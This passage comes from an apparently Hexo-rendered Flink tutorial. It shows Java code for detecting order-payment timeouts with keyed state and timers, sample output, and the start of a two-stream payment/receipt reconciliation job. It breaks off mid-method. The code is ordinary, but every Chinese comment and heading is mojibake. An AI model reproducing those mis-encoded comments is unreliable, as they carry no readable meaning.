&#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">long</span> <span class="title">extractTimestamp</span><span class="params">(OrderEvent element)</span> </span>&#123;</span><br><span class="line">          <span class="keyword">return</span> element.getTimestamp() * <span class="number">1000L</span>;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    ));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// å®šä¹‰è‡ªå®šä¹‰å¤„ç†å‡½æ•°ï¼Œä¸»æµè¾“å‡ºæ­£å¸¸åŒ¹é…è®¢å•äº‹ä»¶ï¼Œä¾§è¾“å‡ºæµè¾“å‡ºè¶…æ—¶æŠ¥è­¦äº‹ä»¶</span></span><br><span class="line">    SingleOutputStreamOperator&lt;OrderResult&gt; resultStream = orderEventDataStream.keyBy(OrderEvent::getOrderId)</span><br><span class="line">      .process(<span class="keyword">new</span> OrderPayMatchDetect());</span><br><span class="line"></span><br><span class="line">    resultStream.print(<span class="string">&quot;pay normally&quot;</span>);</span><br><span class="line">    resultStream.getSideOutput(orderTimeoutTag).print(<span class="string">&quot;timeout&quot;</span>);</span><br><span class="line"></span><br><span class="line">    env.execute(<span class="string">&quot;order timeout detect without cep job&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">OrderPayMatchDetect</span> <span class="keyword">extends</span> <span class="title">KeyedProcessFunction</span>&lt;<span class="title">Long</span>, <span class="title">OrderEvent</span>, <span class="title">OrderResult</span>&gt; </span>&#123;</span><br><span class="line">    <span class="comment">// å®šä¹‰çŠ¶æ€ï¼Œä¿å­˜ä¹‹å‰ç‚¹å•æ˜¯å¦å·²ç»æ¥è¿‡createã€payçš„äº‹ä»¶</span></span><br><span class="line">    ValueState&lt;Boolean&gt; isPayedState;</span><br><span class="line">    ValueState&lt;Boolean&gt; isCreatedState;</span><br><span class="line">    <span class="comment">// å®šä¹‰çŠ¶æ€ï¼Œä¿å­˜å®šæ—¶å™¨æ—¶é—´æˆ³</span></span><br><span class="line">    ValueState&lt;Long&gt; timerTsState;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">open</span><span class="params">(Configuration parameters)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">      isPayedState = getRuntimeContext().getState(<span class="keyword">new</span> ValueStateDescriptor&lt;Boolean&gt;(<span class="string">&quot;is-payed&quot;</span>, Boolean.class, <span class="keyword">false</span>));</span><br><span class="line">      isCreatedState = getRuntimeContext().getState(<span class="keyword">new</span> ValueStateDescriptor&lt;Boolean&gt;(<span class="string">&quot;is-created&quot;</span>, Boolean.class, <span class="keyword">false</span>));</span><br><span class="line">      timerTsState = getRuntimeContext().getState(<span class="keyword">new</span> ValueStateDescriptor&lt;Long&gt;(<span class="string">&quot;timer-ts&quot;</span>, Long.class));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">processElement</span><span class="params">(OrderEvent value, Context ctx, Collector&lt;OrderResult&gt; out)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">      <span class="comment">// å…ˆè·å–å½“å‰çŠ¶æ€</span></span><br><span class="line">      Boolean isPayed = isPayedState.value();</span><br><span class="line">      Boolean isCreated = isCreatedState.value();</span><br><span class="line">      Long timerTs = timerTsState.value();</span><br><span class="line"></span><br><span class="line">      <span class="comment">// åˆ¤æ–­å½“å‰äº‹ä»¶ç±»å‹</span></span><br><span class="line">      <span class="keyword">if</span> (<span class="string">&quot;create&quot;</span>.equals(value.getEventType())) &#123;</span><br><span class="line">        <span class="comment">// 1. å¦‚æœæ¥çš„æ˜¯createï¼Œè¦åˆ¤æ–­æ˜¯å¦æ”¯ä»˜è¿‡</span></span><br><span class="line">        <span class="keyword">if</span> (isPayed) &#123;</span><br><span class="line">          <span class="comment">// 1.1 å¦‚æœå·²ç»æ­£å¸¸æ”¯ä»˜ï¼Œè¾“å‡ºæ­£å¸¸åŒ¹é…ç»“æœ</span></span><br><span class="line">          out.collect(<span class="keyword">new</span> OrderResult(value.getOrderId(), <span class="string">&quot;payed successfully&quot;</span>));</span><br><span class="line">          <span class="comment">// æ¸…ç©ºçŠ¶æ€ï¼Œåˆ é™¤å®šæ—¶å™¨</span></span><br><span class="line">          isCreatedState.clear();</span><br><span class="line">          isPayedState.clear();</span><br><span class="line">          timerTsState.clear();</span><br><span class="line">          ctx.timerService().deleteEventTimeTimer(timerTs);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">          <span class="comment">// 1.2 å¦‚æœæ²¡æœ‰æ”¯ä»˜è¿‡ï¼Œæ³¨å†Œ15åˆ†é’Ÿåçš„å®šæ—¶å™¨ï¼Œå¼€å§‹ç­‰å¾…æ”¯ä»˜äº‹ä»¶</span></span><br><span class="line">          Long ts = (value.getTimestamp() + <span class="number">15</span> * <span class="number">60</span>) * <span class="number">1000L</span>;</span><br><span class="line">          ctx.timerService().registerEventTimeTimer(ts);</span><br><span class="line">          <span class="comment">// æ›´æ–°çŠ¶æ€</span></span><br><span class="line">          timerTsState.update(ts);</span><br><span class="line">          isCreatedState.update(<span class="keyword">true</span>);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="string">&quot;pay&quot;</span>.equals(value.getEventType())) &#123;</span><br><span class="line">        <span class="comment">// 2. å¦‚æœæ¥çš„æ˜¯payï¼Œè¦åˆ¤æ–­æ˜¯å¦æœ‰ä¸‹å•äº‹ä»¶æ¥è¿‡</span></span><br><span class="line">        <span class="keyword">if</span> (isCreated) &#123;</span><br><span class="line">          <span class="comment">// 2.1 å·²ç»æœ‰è¿‡ä¸‹å•äº‹ä»¶ï¼Œè¦ç»§ç»­åˆ¤æ–­æ”¯ä»˜çš„æ—¶é—´æˆ³æ˜¯å¦è¶…è¿‡15åˆ†é’Ÿ</span></span><br><span class="line">          <span class="keyword">if</span> (value.getTimestamp() * <span class="number">1000L</span> &lt; timerTs) &#123;</span><br><span class="line">            <span class="comment">// 2.1.1 åœ¨15åˆ†é’Ÿå†…ï¼Œæ²¡æœ‰è¶…æ—¶ï¼Œæ­£å¸¸åŒ¹é…è¾“å‡º</span></span><br><span class="line">            out.collect(<span class="keyword">new</span> OrderResult(value.getOrderId(), <span class="string">&quot;payed successfully&quot;</span>));</span><br><span class="line">          &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// 2.1.2 å·²ç»è¶…æ—¶ï¼Œè¾“å‡ºä¾§è¾“å‡ºæµæŠ¥è­¦</span></span><br><span class="line">            ctx.output(orderTimeoutTag, <span class="keyword">new</span> OrderResult(value.getOrderId(), <span class="string">&quot;payed but already timeout&quot;</span>));</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="comment">// ç»Ÿä¸€æ¸…ç©ºçŠ¶æ€</span></span><br><span class="line">          isCreatedState.clear();</span><br><span class="line">          isPayedState.clear();</span><br><span class="line">          timerTsState.clear();</span><br><span class="line">          ctx.timerService().deleteEventTimeTimer(timerTs);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">          <span class="comment">// 2.2 æ²¡æœ‰ä¸‹å•äº‹ä»¶ï¼Œä¹±åºï¼Œæ³¨å†Œä¸€ä¸ªå®šæ—¶å™¨ï¼Œç­‰å¾…ä¸‹å•äº‹ä»¶</span></span><br><span class="line">          ctx.timerService().registerEventTimeTimer(value.getTimestamp() * <span class="number">1000L</span>);</span><br><span class="line">          <span class="comment">// æ›´æ–°çŠ¶æ€</span></span><br><span class="line">          timerTsState.update(value.getTimestamp() * <span class="number">1000L</span>);</span><br><span class="line">          isPayedState.update(<span class="keyword">true</span>);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onTimer</span><span class="params">(<span class="keyword">long</span> timestamp, OnTimerContext ctx, Collector&lt;OrderResult&gt; out)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">      <span class="comment">// å®šæ—¶å™¨è§¦å‘ï¼Œè¯´æ˜ä¸€å®šæœ‰ä¸€ä¸ªäº‹ä»¶æ²¡æ¥</span></span><br><span class="line">      <span class="keyword">if</span> (isPayedState.value()) &#123;</span><br><span class="line">        <span class="comment">// å¦‚æœpayæ¥äº†ï¼Œè¯´æ˜createæ²¡æ¥</span></span><br><span class="line">        ctx.output(orderTimeoutTag, <span class="keyword">new</span> OrderResult(ctx.getCurrentKey(), <span class="string">&quot;payed but not found created log&quot;</span>));</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// å¦‚æœpayæ²¡æ¥ï¼Œæ”¯ä»˜è¶…æ—¶</span></span><br><span class="line">        ctx.output(orderTimeoutTag, <span class="keyword">new</span> OrderResult(ctx.getCurrentKey(), <span class="string">&quot;timeout&quot;</span>));</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="comment">// æ¸…ç©ºçŠ¶æ€</span></span><br><span class="line">      isCreatedState.clear();</span><br><span class="line">      isPayedState.clear();</span><br><span class="line">      timerTsState.clear();</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p> è¾“å‡º  </p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">pay normally&gt; OrderResult&#123;orderId=34729, resultState=&#x27;payed successfully&#x27;&#125;</span><br><span class="line">pay normally&gt; OrderResult&#123;orderId=34730, resultState=&#x27;payed successfully&#x27;&#125;</span><br><span class="line">pay normally&gt; OrderResult&#123;orderId=34731, resultState=&#x27;payed successfully&#x27;&#125;</span><br><span class="line">pay normally&gt; OrderResult&#123;orderId=34732, resultState=&#x27;payed successfully&#x27;&#125;</span><br><span class="line">pay normally&gt; OrderResult&#123;orderId=34734, resultState=&#x27;payed successfully&#x27;&#125;</span><br><span class="line">pay normally&gt; OrderResult&#123;orderId=34733, resultState=&#x27;payed successfully&#x27;&#125;</span><br><span class="line">pay normally&gt; OrderResult&#123;orderId=34735, resultState=&#x27;payed successfully&#x27;&#125;</span><br><span class="line">pay normally&gt; OrderResult&#123;orderId=34736, resultState=&#x27;payed successfully&#x27;&#125;</span><br><span class="line">pay normally&gt; OrderResult&#123;orderId=34746, resultState=&#x27;payed successfully&#x27;&#125;</span><br><span class="line">pay normally&gt; OrderResult&#123;orderId=34738, resultState=&#x27;payed successfully&#x27;&#125;</span><br><span class="line">pay normally&gt; OrderResult&#123;orderId=34745, resultState=&#x27;payed successfully&#x27;&#125;</span><br><span class="line">pay normally&gt; OrderResult&#123;orderId=34741, resultState=&#x27;payed successfully&#x27;&#125;</span><br><span class="line">pay normally&gt; OrderResult&#123;orderId=34747, resultState=&#x27;payed successfully&#x27;&#125;</span><br><span class="line">pay normally&gt; OrderResult&#123;orderId=34743, resultState=&#x27;payed successfully&#x27;&#125;</span><br><span class="line">pay normally&gt; OrderResult&#123;orderId=34737, resultState=&#x27;payed successfully&#x27;&#125;</span><br><span class="line">pay normally&gt; OrderResult&#123;orderId=34744, resultState=&#x27;payed successfully&#x27;&#125;</span><br><span class="line">pay normally&gt; OrderResult&#123;orderId=34742, resultState=&#x27;payed successfully&#x27;&#125;</span><br><span class="line">pay normally&gt; OrderResult&#123;orderId=34739, resultState=&#x27;payed successfully&#x27;&#125;</span><br><span class="line">pay normally&gt; OrderResult&#123;orderId=34740, resultState=&#x27;payed successfully&#x27;&#125;</span><br><span class="line">pay normally&gt; OrderResult&#123;orderId=34753, resultState=&#x27;payed successfully&#x27;&#125;</span><br><span class="line">pay normally&gt; OrderResult&#123;orderId=34749, resultState=&#x27;payed successfully&#x27;&#125;</span><br><span class="line">pay normally&gt; OrderResult&#123;orderId=34755, resultState=&#x27;payed successfully&#x27;&#125;</span><br><span class="line">pay normally&gt; OrderResult&#123;orderId=34752, resultState=&#x27;payed successfully&#x27;&#125;</span><br><span class="line">pay normally&gt; OrderResult&#123;orderId=34748, resultState=&#x27;payed successfully&#x27;&#125;</span><br><span class="line">pay normally&gt; OrderResult&#123;orderId=34751, resultState=&#x27;payed successfully&#x27;&#125;</span><br><span class="line">pay normally&gt; OrderResult&#123;orderId=34750, resultState=&#x27;payed successfully&#x27;&#125;</span><br><span class="line">pay normally&gt; OrderResult&#123;orderId=34761, resultState=&#x27;payed successfully&#x27;&#125;</span><br><span class="line">pay normally&gt; OrderResult&#123;orderId=34759, resultState=&#x27;payed successfully&#x27;&#125;</span><br><span class="line">pay normally&gt; OrderResult&#123;orderId=34754, resultState=&#x27;payed successfully&#x27;&#125;</span><br><span class="line">pay normally&gt; OrderResult&#123;orderId=34758, resultState=&#x27;payed successfully&#x27;&#125;</span><br><span class="line">pay normally&gt; OrderResult&#123;orderId=34760, resultState=&#x27;payed successfully&#x27;&#125;</span><br><span class="line">pay normally&gt; OrderResult&#123;orderId=34757, resultState=&#x27;payed successfully&#x27;&#125;</span><br><span class="line">pay normally&gt; OrderResult&#123;orderId=34762, resultState=&#x27;payed successfully&#x27;&#125;</span><br><span class="line">pay normally&gt; OrderResult&#123;orderId=34763, resultState=&#x27;payed successfully&#x27;&#125;</span><br><span class="line">pay normally&gt; OrderResult&#123;orderId=34764, resultState=&#x27;payed successfully&#x27;&#125;</span><br><span class="line">pay normally&gt; OrderResult&#123;orderId=34765, resultState=&#x27;payed successfully&#x27;&#125;</span><br><span class="line">pay normally&gt; OrderResult&#123;orderId=34766, resultState=&#x27;payed successfully&#x27;&#125;</span><br><span class="line"><span class="meta">timeout&gt;</span><span class="bash"> OrderResult&#123;orderId=34767, resultState=<span class="string">&#x27;payed but already timeout&#x27;</span>&#125;</span></span><br><span class="line"><span class="meta">timeout&gt;</span><span class="bash"> OrderResult&#123;orderId=34768, resultState=<span class="string">&#x27;payed but not found created log&#x27;</span>&#125;</span></span><br><span class="line"><span class="meta">timeout&gt;</span><span class="bash"> OrderResult&#123;orderId=34756, resultState=<span class="string">&#x27;timeout&#x27;</span>&#125;</span></span><br></pre></td></tr></table></figure></li></ul><h5 id="è®¢å•æ”¯ä»˜å®æ—¶å¯¹å¸"><a href="#è®¢å•æ”¯ä»˜å®æ—¶å¯¹å¸" class="headerlink" title="è®¢å•æ”¯ä»˜å®æ—¶å¯¹å¸"></a>è®¢å•æ”¯ä»˜å®æ—¶å¯¹å¸</h5><ul><li>åŸºæœ¬éœ€æ±‚ <ul><li>ç”¨æˆ·ä¸‹å•å¹¶æ”¯ä»˜ä¹‹åï¼Œåº”æŸ¥è¯¢åˆ°è´¦ä¿¡æ¯ï¼Œè¿›è¡Œå®æ—¶å¯¹å¸</li><li>å¦‚æœæœ‰ä¸åŒ¹é…çš„æ”¯ä»˜ä¿¡æ¯æˆ–è€…åˆ°è´¦ä¿¡æ¯ï¼Œè¾“å‡ºæç¤ºä¿¡æ¯</li></ul></li><li>è§£å†³æ€è·¯ <ul><li>ä»ä¸¤æ¡æµä¸­åˆ†åˆ«è¯»å–è®¢å•æ”¯ä»˜ä¿¡æ¯å’Œåˆ°è´¦ä¿¡æ¯ï¼Œåˆå¹¶å¤„ç†</li><li>ç”¨connectè¿æ¥åˆå¹¶ä¸¤æ¡æµï¼Œç”¨coProcessFunctionåšåŒ¹é…å¤„ç†</li></ul></li></ul><h6 id="POJO-6"><a href="#POJO-6" class="headerlink" title="POJO"></a>POJO</h6><ul><li> ReceiptEvent  <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> String txId;</span><br><span class="line"><span class="keyword">private</span> String payChannel;</span><br><span class="line"><span class="keyword">private</span> Long timestamp;</span><br></pre></td></tr></table></figure></li></ul><h6 id="ä»£ç 1-å…·ä½“å®ç°"><a href="#ä»£ç 1-å…·ä½“å®ç°" class="headerlink" title="ä»£ç 1-å…·ä½“å®ç°"></a>ä»£ç 1-å…·ä½“å®ç°</h6><ul><li><p> javaä»£ç å®ç°  </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> beans.OrderEvent;</span><br><span class="line"><span class="keyword">import</span> beans.ReceiptEvent;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.api.common.state.ValueState;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.api.common.state.ValueStateDescriptor;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.api.java.tuple.Tuple2;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.configuration.Configuration;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.datastream.DataStream;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.datastream.SingleOutputStreamOperator;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.environment.StreamExecutionEnvironment;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.functions.co.CoProcessFunction;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.functions.timestamps.BoundedOutOfOrdernessTimestampExtractor;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.windowing.time.Time;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.runtime.operators.util.AssignerWithPeriodicWatermarksAdapter;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.util.Collector;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.util.OutputTag;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.util.concurrent.TimeUnit;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> : Ashiamd email: ashiamd@foxmail.com</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@date</span> : 2021/2/6 5:34 PM</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TxPayMatch</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// å®šä¹‰ä¾§è¾“å‡ºæµæ ‡ç­¾</span></span><br><span class="line">  <span class="keyword">private</span> <span class="keyword">final</span> <span class="keyword">static</span> OutputTag&lt;OrderEvent&gt; unmatchedPays = <span class="keyword">new</span> OutputTag&lt;OrderEvent&gt;(<span class="string">&quot;unmatched-pays&quot;</span>)&#123;&#125;;</span><br><span class="line">  <span class="keyword">private</span> <span class="keyword">final</span> <span class="keyword">static</span> OutputTag&lt;ReceiptEvent&gt; unmatchedReceipts = <span class="keyword">new</span> OutputTag&lt;ReceiptEvent&gt;(<span class="string">&quot;unmatched-receipts&quot;</span>)&#123;&#125;;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    StreamExecutionEnvironment env = StreamExecutionEnvironment.getExecutionEnvironment();</span><br><span class="line">    env.setParallelism(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// è¯»å–æ•°æ®å¹¶è½¬æ¢æˆPOJOç±»å‹</span></span><br><span class="line">    <span class="comment">// è¯»å–è®¢å•æ”¯ä»˜äº‹ä»¶æ•°æ®</span></span><br><span class="line">    URL orderResource = TxPayMatch.class.getResource(<span class="string">&quot;/OrderLog.csv&quot;</span>);</span><br><span class="line">    DataStream&lt;OrderEvent&gt; orderEventStream = env.readTextFile(orderResource.getPath())</span><br><span class="line">      .map(line -&gt; &#123;</span><br><span class="line">        String[] fields = line.split(<span class="string">&quot;,&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> OrderEvent(<span class="keyword">new</span> Long(fields[<span class="number">0</span>]), fields[<span class="number">1</span>], fields[<span class="number">2</span>], <span class="keyword">new</span> Long(fields[<span class="number">3</span>]));</span><br><span class="line">      &#125;)</span><br><span class="line">      .assignTimestampsAndWatermarks(<span class="keyword">new</span> AssignerWithPeriodicWatermarksAdapter.Strategy&lt;&gt;(</span><br><span class="line">        <span class="keyword">new</span> BoundedOutOfOrdernessTimestampExtractor&lt;OrderEvent&gt;(Time.of(<span class="number">200</span>, TimeUnit.MILLISECONDS)) &#123;</span><br><span class="line">          <span class="meta">@Override</span></span><br><span class="line">          <span class="function"><span class="keyword">public</span> <span class="keyword">long</span> <span class="title">extractTimestamp</span><span class="params">(OrderEvent element)</span> </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> element.getTimestamp() * <span class="number">1000L</span>;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      ))</span><br><span class="line">      <span class="comment">// äº¤æ˜“idä¸ä¸ºç©ºï¼Œå¿…é¡»æ˜¯payäº‹ä»¶</span></span><br><span class="line">      .filter(data -&gt; !<span class="string">&quot;&quot;</span>.equals(data.getTxId()));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// è¯»å–åˆ°è´¦äº‹ä»¶æ•°æ®</span></span><br><span class="line">    URL receiptResource = TxPayMatch.class.getResource(<span class="string">&quot;/ReceiptLog.csv&quot;</span>);</span><br><span class="line">    SingleOutputStreamOperator&lt;ReceiptEvent&gt; receiptEventStream = env.readTextFile(receiptResource.getPath())</span><br><span class="line">      .map(line -&gt; &#123;</span><br><span class="line">        String[] fields = line.split(<span class="string">&quot;,&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> ReceiptEvent(fields[<span class="number">0</span>], fields[<span class="number">1</span>], <span class="keyword">new</span> Long(fields[<span class="number">2</span>]));</span><br><span class="line">      &#125;)</span><br><span class="line">      .assignTimestampsAndWatermarks(<span class="keyword">new</span> AssignerWithPeriodicWatermarksAdapter.Strategy&lt;&gt;(</span><br><span class="line">        <span class="keyword">new</span> BoundedOutOfOrdernessTimestampExtractor&lt;ReceiptEvent&gt;(Time.of(<span class="number">200</span>, TimeUnit.MILLISECONDS)) &#123;</span><br><span class="line">          <span class="meta">@Override</span></span><br><span class="line">          <span class="function"><span class="keyword">public</span> <span class="keyword">long</span> <span class="title">extractTimestamp</span><span class="params">(ReceiptEvent element)</span> </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> element.getTimestamp() * <span class="number">1000L</span>;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      ));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// å°†ä¸¤æ¡æµè¿›è¡Œè¿æ¥åˆå¹¶ï¼Œè¿›è¡ŒåŒ¹é…å¤„ç†ï¼Œä¸åŒ¹é…çš„äº‹ä»¶è¾“å‡ºåˆ°ä¾§è¾“å‡ºæµ</span></span><br><span class="line">    SingleOutputStreamOperator&lt;Tuple2&lt;OrderEvent, ReceiptEvent&gt;&gt; resultStream = orderEventStream.keyBy(OrderEvent::getTxId)</span><br><span class="line">      .connect(receiptEventStream.keyBy(ReceiptEvent::getTxId))</span><br><span class="line">      .process(<span class="keyword">new</span> TxPayMatchDetect());</span><br><span class="line"></span><br><span class="line">    resultStream.print(<span class="string">&quot;matched-pays&quot;</span>);</span><br><span class="line">    resultStream.getSideOutput(unmatchedPays).print(<span class="string">&quot;unmatched-pays&quot;</span>);</span><br><span class="line">    resultStream.getSideOutput(unmatchedReceipts).print(<span class="string">&quot;unmatched-receipts&quot;</span>);</span><br><span class="line"></span><br><span class="line">    env.execute(<span class="string">&quot;tx match detect job&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// å®ç°è‡ªå®šä¹‰CoProcessFunction</span></span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">TxPayMatchDetect</span> <span class="keyword">extends</span> <span class="title">CoProcessFunction</span>&lt;<span class="title">OrderEvent</span>, <span class="title">ReceiptEvent</span>, <span class="title">Tuple2</span>&lt;<span class="title">OrderEvent</span>, <span class="title">ReceiptEvent</span>&gt;&gt; </span>&#123;</span><br><span class="line">    <span class="comment">// å®šä¹‰çŠ¶æ€ï¼Œä¿å­˜å½“å‰å·²ç»åˆ°æ¥çš„è®¢å•æ”¯ä»˜äº‹ä»¶å’Œåˆ°è´¦æ—¶é—´</span></span><br><span class="line">    ValueState&lt;OrderEvent&gt; payState;</span><br><span class="line">    ValueState&lt;ReceiptEvent&gt; receiptState;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">open</span><span class="params">(Configuration parameters)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">      payState = getRuntimeContext().getState(<span class="keyword">new</span> ValueStateDescriptor&lt;OrderEvent&gt;(<span class="string">&quot;pay&quot;</span>, OrderEvent.class));</span><br><span class="line">      receiptState = getRuntimeContext().getState(<span class="keyword">new</span> ValueStateDescriptor&lt;ReceiptEvent&gt;(<span class="string">&quot;receipt&quot;</span>, ReceiptEvent.class));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">processElement1</span><span class="params">(OrderEvent pay, Context ctx, 